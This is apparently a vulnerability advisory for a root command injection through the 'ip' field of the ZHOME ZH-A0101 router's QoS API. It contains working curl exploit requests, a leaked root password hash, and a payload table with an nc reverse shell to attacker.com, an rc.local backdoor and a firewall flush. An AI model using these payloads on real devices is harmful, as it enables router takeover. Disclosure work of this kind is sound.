# Command Injection Vulnerability in ZHOME ZH-A0101 set_online_client via `ip`
## Overview

- **Vendor:** Ziroom
- **Product:** ZHOME-A0101
- **Firmware Version:** 1.0.1.0, Build 202004151405
- **Platform:** OpenWrt / MediaTek MT7621, MIPS32
- **Vulnerability Type:** Command Injection
- **Affected Endpoint:** `POST /api/ZRQos/set_online_client`
- **Affected Parameter:** `ip`
- **Authentication Requirement:** HTTP Basic Auth as `root`
- **Severity:** Critical

## Vulnerability Information

| Item                | Detail                                                     |
| ------------------- | ---------------------------------------------------------- |
| File                | `usr/lib/lua/luci/controller/api/zrQos.lua`                |
| Function            | `set_online_client()`                                      |
| Code Location       | line 306-376                                               |
| Injection Location  | line 370, line 371, line 375, line 376                     |
| Endpoint            | `POST /api/ZRQos/set_online_client`                        |
| Injection Parameter | `ip`                                                       |
| Injection Method    | `;` command separator executed through `LuciUtil.exec()`   |
| Trigger Condition   | `internet_enable=1` and `down_limit > 0` or `up_limit > 0` |
| Authentication      | HTTP Basic Auth (`root`)                                   |

## Vulnerable Code
<img width="1661" height="1233" alt="a3bee495882fba41af02c0cc5f4e3b70" src="https://github.com/user-attachments/assets/9af71b01-f1e8-4c28-8c42-078b881cab91" />
<img width="2268" height="1068" alt="9f8ef494f9c8330e8bcbca026e0454d4" src="https://github.com/user-attachments/assets/cf2d9d1c-8de7-4e67-ae02-7ba2ffe6884c" />


```lua
-- zrQos.lua line 306-376
function set_online_client()
    luci.http.prepare_content("application/json")
    local LuciUtil = require("luci.util")
    local result = {code=0}

    local mac = luci.http.formvalue("mac")
    local ip = luci.http.formvalue("ip")
    local hostname = luci.http.formvalue("hostname")
    local internet_enable = tonumber(luci.http.formvalue("internet_enable"))
    local down_limit = tonumber(luci.http.formvalue("down_limit"))
    local up_limit = tonumber(luci.http.formvalue("up_limit"))

    local name = string.upper(string.gsub(mac,":","_"))
    cur_section = uciCursor:get_all("ZROnlineList",name)

    if cur_section == nil then
        uciCursor:section("ZROnlineList","limit",name,{...})

        if internet_enable == 1 then
            if down_limit > 0 then
                down_burst = down_limit + 1
                LuciUtil.exec("iptables -t mangle -A limit_chain --dst " .. ip ..
                    " -m hashlimit --hashlimit-name dst_" .. name ..
                    " --hashlimit " .. down_limit .. "kb/s --hashlimit-burst " ..
                    down_burst .. "kb --hashlimit-mode dstip -j RETURN > /dev/null 2>&1")

                LuciUtil.exec("iptables -t mangle -A limit_chain --dst " .. ip ..
                    " -j DROP > /dev/null 2>&1")
            end

            if up_limit > 0 then
                up_burst = up_limit + 1
                LuciUtil.exec("iptables -t mangle -A limit_chain --src " .. ip ..
                    " -m hashlimit --hashlimit-name src_" .. name ..
                    " --hashlimit " .. up_limit .. "kb/s --hashlimit-burst " ..
                    up_burst .. "kb --hashlimit-mode srcip -j RETURN > /dev/null 2>&1")

                LuciUtil.exec("iptables -t mangle -A limit_chain --src " .. ip ..
                    " -j DROP > /dev/null 2>&1")
            end
        end
    end
end
```

The `ip` parameter is directly concatenated into multiple `iptables` commands. When `LuciUtil.exec()` executes the generated command string, `/bin/sh` interprets shell metacharacters in the `ip` value.

## Exploit Chain

```text
Attacker
 |
 |-- Step 1: Obtain the root credential.
 |           Firmware password hash:
 |           $1$SD.FRa1K$D8O0ttaPTFvEs0i.0W.Co.
 |
 |-- Step 2: Log in and obtain sysauth cookie plus stok.
 |
 |-- Step 3: Send an authenticated request.
 |           URL:
 |           /api/ZRQos/set_online_client
 |
 |           Required parameters:
 |           mac=00:11:22:33:44:55
 |           ip=<PAYLOAD>
 |           hostname=test
 |           internet_enable=1
 |           down_limit=100
 |           up_limit=100
 |
 |-- Step 4: Inject through the ip parameter.
 |           Normal value:
 |           ip=192.168.18.100
 |
 |           Normal command:
 |           iptables -t mangle -A limit_chain --dst 192.168.18.100 ...
 |
 |           Injected value:
 |           ip=192.168.18.100;id>/tmp/vuln29.txt
 |
 |           Final command:
 |           iptables -t mangle -A limit_chain --dst 192.168.18.100;id>/tmp/vuln29.txt -m hashlimit ...
 |
 `-- Step 5: /bin/sh executes the injected command.
             cat /tmp/vuln29.txt returns uid=0(root) gid=0(root)
```

## Trigger Request

### Obtain `stok`

```bash
STOK=$(curl -s --noproxy "*" -c cookies.txt -X POST \
  "http://192.168.18.1/cgi-bin/luci" \
  -d "username=root&password=admin" \
  -L -D headers.txt 2>&1 > /dev/null; \
  grep stok headers.txt | sed 's/.*stok=//;s/\r//')
```

### Create a Marker File

```bash
curl -s --noproxy "*" -b cookies.txt -X POST \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRQos/set_online_client" \
  -d "mac=00:11:22:33:44:55&ip=192.168.18.100%3btouch%20/tmp/vuln29.txt&hostname=test&internet_enable=1&down_limit=100&up_limit=100"
```

### Execute an Arbitrary Command

```bash
curl -s --noproxy "*" -b cookies.txt -X POST \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRQos/set_online_client" \
  -d "mac=00:11:22:33:44:55&ip=192.168.18.100%3bid>/tmp/id_result.txt&hostname=test&internet_enable=1&down_limit=100&up_limit=100"
```

When using raw `-d`, encode `;` as `%3b` and spaces as `%20`. When using `--data-urlencode`, curl performs the encoding automatically.

## Verification

```bash
ssh -p 1022 root@192.168.18.1 "ls -la /tmp/vuln29.txt && cat /tmp/vuln29.txt"
```
<img width="1800" height="240" alt="6815d0459586690088064cce4d597ad6" src="https://github.com/user-attachments/assets/cefbb868-6fb9-4a35-ac77-84f31a20976b" />


## Injection Point Analysis

The function contains four `LuciUtil.exec()` calls that use the `ip` parameter:

| Line | Command Template                           | Trigger Condition |
| ---- | ------------------------------------------ | ----------------- |
| 370  | `iptables ... --dst <ip> -m hashlimit ...` | `down_limit > 0`  |
| 371  | `iptables ... --dst <ip> -j DROP`          | `down_limit > 0`  |
| 375  | `iptables ... --src <ip> -m hashlimit ...` | `up_limit > 0`    |
| 376  | `iptables ... --src <ip> -j DROP`          | `up_limit > 0`    |

When both `down_limit > 0` and `up_limit > 0`, the injected payload can be evaluated up to four times.

## Exploitation Scenarios

| Scenario         | Payload                                          | Description                   |
| ---------------- | ------------------------------------------------ | ----------------------------- |
| Create file      | `192.168.18.100;touch /tmp/test`                 | Verify command execution      |
| Write output     | `192.168.18.100;id>/tmp/id.txt`                  | Save command output to a file |
| Reverse shell    | `192.168.18.100;nc attacker.com 4444 -e /bin/sh` | Requires `nc` on the device   |
| Persistence      | `192.168.18.100;echo backdoor>>/etc/rc.local`    | Execute on boot               |
| Disable firewall | `192.168.18.100;iptables -F`                     | Flush firewall rules          |
| Kill process     | `192.168.18.100;killall uhttpd`                  | Stop the web service          |



